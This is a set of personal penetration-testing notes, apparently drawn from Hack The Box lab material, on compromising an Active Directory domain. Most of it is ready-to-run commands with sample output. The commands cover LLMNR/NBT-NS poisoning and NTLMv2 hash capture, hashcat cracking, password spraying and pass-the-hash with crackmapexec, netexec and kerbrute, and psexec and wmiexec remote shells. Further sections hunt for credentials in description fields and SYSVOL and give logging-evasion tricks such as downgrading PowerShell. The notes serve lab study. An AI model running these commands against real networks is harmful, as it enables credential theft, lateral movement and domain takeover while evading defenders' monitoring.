# Content
- [Initial Enumeration](#initial-enumeration)
  - [Basic Info](#basic-info)
  - [Enumeration of the Domain](#enumeration-of-the-domain)
  - [Internal AD Username Enumeration](#internal-ad-username-enumeration)
  - [Enumerating DNS Records](#enumerating-dns-records)
- [Get a Foothold](#get-a-foothold)
  - [LLMNR/NBT-NS Poisoning](#llmnrnbt-ns-poisoning)
  - [Password Spraying](#password-spraying)
    - [Enumerating & Retrieving Password Policies](#enumerating--retrieving-password-policies)
    - [Enumerating & Retrieving Valid users](#enumerating--retrieving-valid-users)
    - [Internal Password Spraying](#internal-password-spraying)
    - [Pass the Hash , Pass the Ticket and Relay Attacks](#pass-the-hash--pass-the-ticket-and-relay-attacks)
- [Situational Awareness](#deeper-down-digging)
  - [Enumerating Security Controls](#enumerating-security-controls)
  - [Credentialed Enumeration - from Linux](#credentialed-enumeration---from-linux)
    - [CrackMapExec / Netexec](#crackmapexec--netexec)
    - [Impacket Toolkit](#impacket-toolkit)
    - [Windapsearch](#windapsearch)
    - [Bloodhound.py](#bloodhoundpy)
  - [Credentialed Enumeration - from Windows](#credentialed-enumeration---from-windows)
    - [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
    - [PowerView](#powerview)
    - [SharpView](#sharpview)
    - [Snaffler](#snaffler)
    - [BloodHound](#bloodhound)
    - [Sniffing LDAP Credentials](#sniffing-ldap-credentials)
    - [Password in Description Field](#password-in-description-field)
    - [PASSWD_NOTREQD Field](#password-in-description-field)
    - [Credentials in SMB Shares and SYSVOL Scripts](#credentials-in-smb-shares-and-sysvol-scripts)
  - [Living Off the Land](#living-off-the-land)
    - [Downgrade Powershell](#downgrade-powershell)
    - [Checking Defenses](#checking-defenses)
    - [Windows Management Instrumentation (wMIC)](#windows-management-instrumentation-wmic)
    - [Net Commands](#net-commands)
    - [Dsquery](#dsquery)
    - [dsquery with LDAP search filters](#ldap-filtering-explained)
- [Active Directory Attacks](#active-directory-attacks)
  - [Kerberos attacks](#kerberos-attacks)
  - [Access Control List Abuse](#access-control-list-abuse)
  - [Group Policy Object (GPO) Abuse](#group-policy-object-gpo-abuse)
- [Movement in AD](#movement-in-ad)
  - [Privileged Access](#privileged-access)
    - [Remote Desktop](#remote-desktop)
    - [PowerShell Remoting](#powershell-remoting)
    - [MSSQL Server](#mssql-server) 
  - [Kerberos Double Hop Problem](#kerberos-double-hop-problem)
    - [PSCredential Object](#pscredential-object)
    - [Register PSSession Configuration](#register-pssession-configuration)


# Initial Enumeration

## Basic Info 
### IP Space
- check [BGP Toolkit](https://bgp.he.net/) for ASN and ip ranges

### Domain Registrars & DNS
- [viewdns](https://viewdns.info/)
- [domaintools](https://whois.domaintools.com/)
- [domain.glass](https://domain.glass/)
- [hackertarget zone-transfer](https://hackertarget.com/zone-transfer/)
- manual using dig

### Public Data
#### github 
- [truffleHog](https://github.com/trufflesecurity/truffleHog)
- [hacktricks github-leaked-secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets)
#### cloud senstive files
- [grayhatwarfare](https://buckets.grayhatwarfare.com/)
#### Breach Data
- [haveibeenpwned](https://haveibeenpwned.com/)
- [dehashed](https://www.dehashed.com/)
#### google dorks
- [chr3st5an Google-Dorking cheatsheet](https://github.com/chr3st5an/Google-Dorking)
- [sundowndev Google-Dorking cheatsheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06)

#### linkedin usernames
- [linkedin2username](https://github.com/initstring/linkedin2username)

## Enumeration of the Domain
- wireshark / tcpdump
- responder
```shell
sudo responder -I ens224 -A
```
- fping / ping 
```shell 
fping -asgq 172.16.5.0/23


# msfconsole
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23          

# shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done    

# CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}

```
- nmap

## Internal AD Username Enumeration
#### Kerbrute 

- [kerbrute](ttps://github.com/ropnop/kerbrute/)
- [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
```
sudo git clone https://github.com/ropnop/kerbrute.git
sudo make all
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
## or check compiled binaries https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
```

## Enumerating DNS Records
- We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account.

```shell
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

head records.csv 
```

# Get a Foothold

## LLMNR/NBT-NS Poisoning
[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. 

LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port `5355` over `UDP` natively. 

If LLMNR fails, the `NBT-NS` will be used. NBT-NS identifies systems on a local network by their `NetBIOS name`. NBT-NS utilizes port `137` over `UDP`.



**Example - LLMNR/NBT-NS Poisoning**

Let's walk through a quick example of the attack flow at a very high level:

    A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
    The DNS server responds, stating that this host is unknown.
    The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
    The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
    The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
    This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.


| Tool                                                      | Description                                                                                           |
|-------------                                              |-------------------------------------------------------------------------------------------------------|
| [Responder](https://github.com/lgandx/Responder)          | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.    |
| [Inveigh](https://github.com/Kevin-Robertson/Inveigh)     | Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.        |
| Metasploit  | Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.    |



### LLMNR/NBT-NS Poisoning - from Linux

```shell

# where prev hashes stored /usr/share/responder/logs/
sudo responder -I ens224


[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:2294b990eee35ab0:C2D891F417EBB1E1187877CED230DDED:01010000000000000022B6703BA9DA01E2423A941650ABDB00000000020008004200430058004A0001001E00570049004E002D0047004D0039005600410033003000330030004E00580004003400570049004E002D0047004D0039005600410033003000330030004E0058002E004200430058004A002E004C004F00430041004C00030014004200430058004A002E004C004F00430041004C00050014004200430058004A002E004C004F00430041004C00070008000022B6703BA9DA01060004000200000008003000300000000000000000000000003000001CA7B9124B30F944D887B56A197F9EA349F4808891ECE19A9D46EBFB7856355A0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```
crack the hash
```powerhsell
 .\hashcat.exe -m 5600 "backupagent::INLANEFREIGHT:2294b990eee35ab0:C2D891F417EBB1E1187877CED230DDED:01010000000000000022B6703BA9DA01E2423A941650ABDB00000000020008004200430058004A0001001E00570049004E002D0047004D0039005600410033003000330030004E00580004003400570049004E002D0047004D0039005600410033003000330030004E0058002E004200430058004A002E004C004F00430041004C00030014004200430058004A002E004C004F00430041004C00050014004200430058004A002E004C004F00430041004C00070008000022B6703BA9DA01060004000200000008003000300000000000000000000000003000001CA7B9124B30F944D887B56A197F9EA349F4808891ECE19A9D46EBFB7856355A0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" .\wordlists\rockyou.txt
```

### LLMNR/NBT-NS Poisoning - from Windows
- [Inveigh powershell version ](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)


```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

- [Inveigh c# version](https://github.com/Kevin-Robertson/Inveigh)
```
 .\Inveigh.exe

# Press ESC to enter/exit interactive console
HELP 
GET NTLMV2USERNAMES
GET NTLMV2UNIQUE
```

## Password Spraying
### Enumerating & Retrieving Password Policies

#### 1) SMB NULL Sessions 
**from linux**

- CrackMapExec
```
crackmapexec smb 172.16.5.5 -u "" -p "" --pass-pol
```

- rpcclient
```shell
rpcclient -U "" -N 172.16.5.5
>querydominfo
>getdompwinfo
```
- enum4linux or enum4linux-ng
```shell
enum4linux -P 172.16.5.5

enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
**from windows**
```cmd
net use \\DC01\ipc$ "" /u:""

net accounts /domain
```

#### 2) LDAP Anonymous Bind
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
- [windapsearch](https://github.com/ropnop/windapsearch)
- [ldapsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)

```shell
./windapsearch.py --dc-ip 172.16.5.5 -u ""  --gpos 

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```


#### 3) From windows 
- Using net.exe
```cmd
net accounts
```

- Using PowerView 
```
import-module .\PowerView.ps1
Get-DomainPolicy
```

### Enumerating & Retrieving Valid users
#### 1) SMB NULL Session
**from linux**

- crackmapexec 
```
crackmapexec smb 172.16.5.5 --users
```

- rpcclient 
```
rpcclient -U "" -N 172.16.5.5
> enumdomusers 
```

- enum4linux or enum4linux-ng 
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

#### 2) LDAP Anonymous Bind

```shell
./windapsearch.py --dc-ip 172.16.5.5 --dc-ip -u "" -U

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

#### 3) Enumerating Users with Kerbrute
- This tool uses Kerberos Pre-Authentication for password spraying, which is faster and stealthier than traditional methods.
- It avoids generating Windows event ID `4625` for `logon failures`.
- The tool sends TGT requests without Kerberos Pre-Authentication to identify valid usernames: a PRINCIPAL UNKNOWN error means the username is invalid, while a prompt for `Pre-Authentication` means the username exists.
- This method doesn't cause logon failures or account lockouts during enumeration.
-  Using Kerbrute for username enumeration will generate event ID `4768`: A Kerberos authentication ticket (TGT) was requested. This will only be triggered if `Kerberos event logging` is enabled via Group Policy.
- [kerbrute](https://github.com/ropnop/kerbrute)

```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

### Internal Password Spraying
**From Linux**
- bash  (against smb)
```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
- Kerbrute (against kerberos)
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
- crackMapExec  / netexec
```shell
sudo crackmapexec smb 172.16.5.5-10 -u valid_users.txt -p Password123 | grep +

sudo netexec 172.16.5.5-10 ldap -u valid_users.txt  -p Password123

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +


# you're targeting a non-domain or local account
netexec smb 192.168.110.52-56  -d . -u James  -H :8af1903d3c80d3552a84b6ba296db2ea --shares 
netexec smb 192.168.110.52-56  -u James  -H :8af1903d3c80d3552a84b6ba296db2ea  --local-auth 

```
**From Windows**

- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (against ldap)
```powershell
Import-Module .\DomainPasswordSpray.ps1
# if domain joined
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# if not domain joined
Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt  
```
- [SharpSpray from jnqpblc](https://github.com/jnqpblc/SharpSpray) (against ldap)
- [SharpSpray from iomoath](https://github.com/iomoath/SharpSpray) (against ldap)

- Kerbrute (against kerberos)
```powershell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

#### Notes 
1) It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.
2) When working with `local administrator accounts`, consider `password re-use` or `common password formats` across accounts. If we find a desktop host with the local administrator account password set to something unique such as `$desktop%@admin123`, it might be worth attempting `$server%@admin123` against servers.
3) if we find `non-standard local administrator` accounts such as `bsmith`, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named `ajones`, it is worth trying the same password on their admin account (if the user has one), for example, `ajones_adm`, to see if they are reusing their passwords.
4) We may obtain valid credentials for a user in `domain A` that are valid for a user with the same or similar username in `domain B` or vice-versa.
5) Sometimes we may only retrieve the `NTLM hash` for the `local administrator account` from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set.
6) event ID `4771` which is logged when Kerberos logging is enabled on the Domain Controllers when password spraying against LDAP and kerbros.

### Pass the Hash , Pass the Ticket and Relay Attacks

check [this section in my repo](https://github.com/kiro6/penetration-testing-notes/tree/main/Penetration%20Testing/Password%20Attacks/Windows%20Lateral%20Movement)

# Situational Awareness
## Enumerating Security Controls

### Windows Defender
- **Checking the Status of Defender with Get-MpComputerStatus**
```powershell
PS C:\user> Get-MpComputerStatus
```
### AppLocker
AppLocker is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers


Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other[PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations.php) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`


**Check Using Get-AppLockerPolicy cmdlet**

```
PS C:\user> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
Name                : Block PowerShell
Description         : Blocks Domain Users from using PowerShell on workstations
UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
Action              : Deny

```

### PowerShell Constrained Language Mode
- PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. 
- We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
- [wadcoms project](https://wadcoms.github.io/)

```powershell
PS C:\user> $ExecutionContext.SessionState.LanguageMode
```
### LAPS
- The Microsoft Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. 
- We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed.

**check using [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)**
```
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers

```


## Enumeration - from Linux
- We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more. 
- we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.
### CrackMapExec / Netexec 

```shell
# Domain User Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# Domain Group Enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# Logged On Users
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# Spider_plus
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```


### Impacket Toolkit

#### Psexec.py
- The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. 
- It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
- On a non-domain join computer, you must have a local admin user. You will use that username when connecting to the machine via psexec.
- If the computer is domain joined, then you will want to use either a local administrator on the target machine or a domain administrator account.
- The machine must have the administrative share open on the computer and the user you are connecting as must have permissions to the share. (Administrators)
- You must have certain firewall rules in place. (Again, something that is normally turned on on a domain join.)


```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

#### wmiexec.py
- it runs as the local admin user we connected 
- each command issued will execute a new cmd.exe from WMI and execute your command. 
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

### Windapsearch

```shell
# Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Privileged Users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### Bloodhound.py

```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

bloodhound-python -u 'riley' -p 'P@ssw0rd'  -ns 192.168.110.55  -d painters.htb -c all --dns-tcp 

ls
sudo neo4j start 
zip -r ilfreight_bh.zip *.json
## upload zip file in bloodhound
bloodhound
```

## Enumeration - from Windows
### ActiveDirectory PowerShell Module

```powershell
Import-Module ActiveDirectory
Get-Module

# Get Domain Info
Get-ADDomain

# Get-ADUser filtering for accounts with the ServicePrincipalName property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Checking For Trust Relationships
Get-ADTrust -Filter *

# Group Enumeration
Get-ADGroup -Filter * | select name

# Detailed Group Info
Get-ADGroup -Identity "Backup Operators"

# Group Membership
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView

- [BC-SECURITY version of PowerView](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1)


| Command                      | Description                                                                             |
|------------------------------|-----------------------------------------------------------------------------------------|
| Export-PowerViewCSV          | Append results to a CSV file                                                            |
| ConvertTo-SID                | Convert a User or group name to its SID value                                            |
| Get-DomainSPNTicket          | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account        |
| `Domain/LDAP Functions:`       |                                                                                         |
| Get-Domain                   | Will return the AD object for the current (or specified) domain                          |
| Get-DomainController         | Return a list of the Domain Controllers for the specified domain                         |
| Get-DomainUser               | Will return all users or specific user objects in AD                                     |
| Get-DomainComputer           | Will return all computers or specific computer objects in AD                             |
| Get-DomainGroup              | Will return all groups or specific group objects in AD                                    |
| Get-DomainOU                 | Search for all or specific OU objects in AD                                               |
| Find-InterestingDomainAcl    | Finds object ACLs in the domain with modification rights set to non-built in objects     |
| Get-DomainGroupMember        | Will return the members of a specific domain group                                        |
| Get-DomainFileServer         | Returns a list of servers likely functioning as file servers                             |
| Get-DomainDFSShare           | Returns a list of all distributed file systems for the current (or specified) domain      |
| `GPO Functions:`               |                                                                                         |
| Get-DomainGPO                | Will return all GPOs or specific GPO objects in AD                                         |
| Get-DomainPolicy             | Returns the default domain policy or the domain controller policy for the current domain |
| `Computer Enumeration Functions:` |                                                                                       |
| Get-NetLocalGroup            | Enumerates local groups on the local or a remote machine                                  |
| Get-NetLocalGroupMember      | Enumerates members of a specific local group                                              |
| Get-NetShare                 | Returns open shares on the local (or a remote) machine                                     |
| Get-NetSession               | Will return session information for the local (or a remote) machine                        |
| Test-AdminAccess             | Tests if the current user has administrative access to the local (or a remote) machine     |
| `Threaded 'Meta'-Functions:`   |                                                                                         |
| Find-DomainUserLocation      | Finds machines where specific users are logged in                                         |
| Find-DomainShare             | Finds reachable shares on domain machines                                                  |
| Find-InterestingDomainShareFile | Searches for files matching specific criteria on readable shares in the domain          |
| Find-LocalAdminAccess        | Find machines on the local domain where the current user has local administrator access  |
| `Domain Trust Functions:`      |                                                                                         |
| Get-DomainTrust              | Returns domain trusts for the current domain or a specified domain                        |
| Get-ForestTrust              | Returns all forest trusts for the current forest or a specified forest                    |
| Get-DomainForeignUser        | Enumerates users who are in groups outside of the user's domain                           |
| Get-DomainForeignGroupMember | Enumerates groups with users outside of the group's domain and returns each foreign member|
| Get-DomainTrustMapping       | Will enumerate all trusts for the current domain and any others seen                      |


```powershell
# Domain User Information (mmorgan)
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Recursive Group Membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust Enumeration
Get-DomainTrustMapping

# Testing for Local Admin Access
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName


```

### SharpView
- [.NET port of PowerView](https://github.com/tevora-threat/SharpView?tab=readme-ov-file)

```
.\SharpView.exe Get-DomainUser -Identity forend

```

### Snaffler
[Snaffler](https://github.com/SnaffCon/Snaffler) works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories

```powershell
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

### BloodHound
- [BloodHound Collectors Builds](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors/DebugBuilds)
- [SharpHound .NET](https://github.com/BloodHoundAD/SharpHound)
- [SharpHound powershell](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
.\SharpHound.exe -c All --zipfilename painters --ldapusername  riley  --ldappassword  P@ssw0rd
.\SharpHound.exe -c All --zipfilename painters2 --doLocalAdminSessionEnum  --localadminusername riley --localadminpassword P@ssw0rd

bloodhound 
```

### Sniffing LDAP Credentials
- Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords.
- Sometimes, these credentials can be viewed in cleartext. 
- Other times, the application has a test connection function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port `389`.
- When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext.
- Accounts used for LDAP connections are often privileged
- check this [blog](https://grimhacker.com/2018/03/09/just-a-printer/)


### Password in Description Field

```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}


samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!


```

### PASSWD_NOTREQD Field

- If this is set, the user is not subject to the current password policy length, meaning they could have a **shorter password or no password at all** (if empty passwords are allowed in the domain).

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

### Credentials in SMB Shares and SYSVOL Scripts

- The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain.

```powershell

ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```


## Living Off the Land
This can also be a more stealthy approach and may not create as many log entries , also when there is noway to upload the tools


| Command                                           | Result                                                                                      |
|---------------------------------------------------|---------------------------------------------------------------------------------------------|
| hostname                                          | Prints the PC's Name                                                                        |
| [System.Environment]::OSVersion.Version           | Prints out the OS version and revision level                                               |
| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patches and hotfixes applied to the host                                    |
| ipconfig /all                                     | Prints out network adapter state and configurations                                        |
| set                                               | Displays a list of environment variables for the current session (ran from CMD-prompt)       |
| echo %USERDOMAIN%                                 | Displays the domain name to which the host belongs (ran from CMD-prompt)                     |
| echo %logonserver%                                | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)  |



| Command | Description |
|---------|-------------|
| `Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Retrieves the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point towards configuration files or scripts that contain passwords. |
| `Get-ChildItem Env: | ft Key,Value` | Returns environment values such as key paths, users, computer information, etc. |

### Downgrade Powershell
- Powershell event logging was introduced as a feature with Powershell 3.0 and forward. 
- With that in mind, we can attempt to call Powershell version 2.0 or older. 
- If successful, our actions from the shell will not be logged in Event Viewer.


```powershell
powershell.exe -version 2

Get-host
```

#### Examining the Powershell Event Log
you can check in `event viewer`

`PowerShell Operational` Log found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`
![Screenshot 2024-06-07 at 14-12-08 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/c601ca98-5f26-495b-858c-34f21ae2f905)


The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell`

![Screenshot 2024-06-07 at 14-12-12 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/602a5583-1924-4793-90f4-fa02aa3f4f58)

### Checking Defenses

#### checked if Defender was running

**Powershell**
```powershell
netsh advfirewall show allprofiles
```
**CMD**
```
sc query windefend
```

#### check the status and configuration settings
```powershell
Get-MpComputerStatus 
```

### Network Information

| Networking Commands              | Description                                                                                  |
|----------------------------------|----------------------------------------------------------------------------------------------|
| arp -a                           | Lists all known hosts stored in the arp table.                                                |
| ipconfig /all                    | Prints out adapter settings for the host. We can figure out the network segment from here.    |
| route print                      | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| netsh advfirewall show state     | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

### Windows Management Instrumentation (wMIC)

- [querying host and domain info using wmic cheat sheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)

| Command                                                                       | Description                                                                                             |
|-------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------|
| wmic qfe get Caption,Description,HotFixID,InstalledOn                         | Prints the patch level and description of the Hotfixes applied.                                         |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list.                               |
| wmic process list /format:list                                                | A listing of all processes on host.                                                                     |
| wmic ntdomain list /format:list                                               | Displays information about the Domain and Domain Controllers.                                           |
| wmic useraccount list /format:list                                            | Displays information about all local accounts and any domain accounts that have logged into the device. |
| wmic group list /format:list                                                  | Information about all local groups.                                                                     |
| wmic sysaccount list /format:list                                             | Dumps information about any system accounts that are being used as service accounts.                    |

### Net Commands

- `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

| Command                                                       | Description                                                                                             |
|---------------------------------------------------------------|---------------------------------------------------------------------------------------------------------|
| net accounts                                                  | Information about password requirements                                                                 |
| net accounts /domain                                          | Password and lockout policy                                                                             |
| net group /domain                                             | Information about domain groups                                                                         |
| net group "Domain Admins" /domain                             | List users with domain admin privileges                                                                 |
| net group "domain computers" /domain                          | List of PCs connected to the domain                                                                     |
| net group "Domain Controllers" /domain                        | List PC accounts of domains controllers                                                                 |
| net group <domain_group_name> /domain                         | User that belongs to the group                                                                          |
| net groups /domain                                            | List of domain groups                                                                                   |
| net localgroup                                                | All available groups                                                                                    |
| net localgroup administrators /domain                         | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| net localgroup Administrators                                 | Information about a group (admins)                                                                      |
| net localgroup administrators [username] /add                 | Add user to administrators                                                                              |
| net share                                                     | Check current shares                                                                                    |
| net user <ACCOUNT_NAME> /domain                               | Get information about a user within the domain                                                          |
| net user /domain                                              | List all users of the domain                                                                            |
| net user %username%                                           | Information about the current user                                                                      |
| net use x: \\computer\share                                    | Mount the share locally                                                                                 |
| net view                                                      | Get a list of computers                                                                                 |
| net view /all /domain[:domainname]                            | Shares on the domains                                                                                   |
| net view \\computer /ALL                                      | List shares of a computer                                                                               |
| net view /domain                                              | List of PCs of the domain                                                                               |


### check other users logged in the system 

```powershell
qwinsta
```

### Dsquery
- `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed

**User Search**
```powershell
# Find all user accounts in the domain
dsquery user

# Find user accounts by name, wildcard * can be used
dsquery user -name "John*"

# Find user accounts by SAM account name
dsquery user -samid johndoe

# Find user accounts by description
dsquery user -desc "Administrator"

# Find user accounts that have been inactive for a certain number of weeks
dsquery user -inactive 4

# Find all disabled user accounts
dsquery user -disabled

# Find user accounts that have not changed their password in a certain number of days
dsquery user -stalepwd 30

# Find user accounts in a specific organizational unit (OU)
dsquery user "OU=Employees,DC=example,DC=com"

# Find user accounts with a specific email address
